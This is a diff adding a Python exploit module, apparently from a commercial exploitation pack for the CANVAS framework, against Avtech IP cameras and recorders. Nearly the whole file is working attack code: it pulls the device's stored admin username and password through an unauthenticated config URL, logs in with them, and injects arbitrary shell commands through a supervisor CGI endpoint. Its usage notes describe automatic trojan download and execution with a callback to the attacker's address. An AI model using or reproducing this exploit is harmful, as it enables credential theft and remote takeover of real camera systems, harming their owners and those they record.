@@ -1,0 +1,149 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+import sys
+import re
+import random
+import base64
+import time
+import thread
+import urllib, urllib2
+import xml.sax.saxutils as saxutils
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.canvasos import *
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "Avetech Remote Command Injection Vulnerability"
+
+DESCRIPTION = "Remote command injection vulnerability in Avetech devices"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Avetech"
+DOCUMENTATION["Date public"] = "2016.10.11"
+DOCUMENTATION["VersionsAffected"] = ""
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "https://packetstormsecurity.com/files/139077/Avtech-IP-Camera-NVR-DVR-CSRF-Disclosure-Command-Injection.html"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 12
+
+-- Automatic MOSDEF trojan download and exec --
+.\3rdparty\D2SEC\exploits\d2sec_continuum\d2sec_avetech.py -v 0 -t 192.168.59.132 -l 192.168.1.1 -d 443
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+    	tcpexploit.__init__(self)
+    	self.setInfo(DESCRIPTION)
+    	self.name = NAME       
+    	self.port = 80    	
+    	self.version = 0
+    	self.protocol = "http"    	  	
+    	self.cmd = ""
+        self.login = "admin"
+        self.password = "admin"
+    	return
+
+ 
+    def run(self):
+    	# Check arguments
+    	self.host = self.target.interface
+    	self.port = int(self.argsDict.get("port", self.port))
+        self.cmd = self.argsDict.get("cmd", self.cmd)           	    	
+        	                	               
+    	self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+    	self.log("Attacking %s:%d"%(self.host, self.port))                                  	
+        
+        ua = spkproxy.UserAgent("", exploit=self)
+        
+        # Get login/password
+        url = "/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*"    
+        mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)        
+        data = ua.GET(mainurl)    
+        
+        m = re.search("Account.User1.Username=(.*)", data)
+        if m is not None:
+            self.login = m.group(1) 
+            self.log("[D2] Found login => %s"%self.login)
+        else:
+            self.log("[D2] Default login: %s"%self.login)            
+        m = re.search("Account.User1.Password=(.*)", data)
+        if m is not None:
+            self.password = m.group(1)
+            self.log("[D2] Found password => %s"%self.password)
+        else:
+            self.log("[D2] Default password: %s"%self.password)            
+
+        # Authenticate  
+        url = "/cgi-bin/nobody/VerifyCode.cgi?account=%s&login=quick"%base64.b64encode("%s:%s"%(self.login,self.password))    
+        mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)        
+        data = ua.GET(mainurl)    
+        
+        if "-35" in data:
+            self.log("[D2] Authentication failed")   
+            return 0     
+        
+        # Command injection                                                        
+        params = 'DoShellCmd "strCmd=%s&"'%self.cmd        
+        url = "/cgi-bin/supervisor/adcommand.cgi"    
+        mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+        data = ua.POST(mainurl, params)    
+        
+        m = re.search('Reply:strResult="(.+)"', data, re.DOTALL)
+        if m is not None:
+            self.log(m.group(1))
+            	                          
+    	return 1
+    	
+        		
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]
+
+    	i = 0
+
+    	print 'Available versions:'
+
+    	for listline in targets.values():
+    		print '\t%d: %s'%(i, listline)
+    		i = i + 1
+
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
